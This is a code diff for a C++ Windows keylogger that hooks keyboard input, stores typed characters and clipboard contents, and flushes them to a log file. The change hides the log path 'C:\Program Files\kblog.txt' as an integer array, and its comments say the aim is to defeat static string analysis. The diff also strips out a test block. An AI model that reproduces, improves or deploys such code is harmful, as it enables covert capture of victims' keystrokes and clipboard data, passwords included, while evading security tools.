@@ -11,6 +11,11 @@ std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
 std::vector<std::string> clipboardVector = {};
 std::string storedClipboardContents = "";
 
+//we do this instead of making it a string literal to somewhat halt static analysis of running strings
+//this resolves to "C:\Program Files\kblog.txt"
+//tested, works (strings doesn't pick it up)
+std::vector<int> pathString = { 67, 58, 92, 80, 114, 111, 103, 114, 97, 109, 32, 70, 105, 108, 101, 115, 92, 107, 98, 108, 111, 103, 46, 116, 120, 116 };
+
 //main entry point
 
 HHOOK* handle_to_hook = new HHOOK;
@@ -59,7 +64,7 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 		}
 #else
 
-		flushChars(savedChars, "C:\\Program Files\\zlog1.txt", error_count, true, 100);
+		flushChars(savedChars, pathString, error_count, true, 500);
 		std::cout << savedChars.size() << '\n';
 
 #endif
@@ -92,12 +97,7 @@ int main()
 {
 #if test
 
-	std::vector<int> ch{1, 12, 5, 10, 587, 87, 176};
-	int count = 0;
-	if (flushChars(ch, "C:\\Users\\Anton C\\Desktop\\log0102.txt", count, false))
-	{
-		std::cout << "success";
-	}
+
 
 #else
 	startHook();
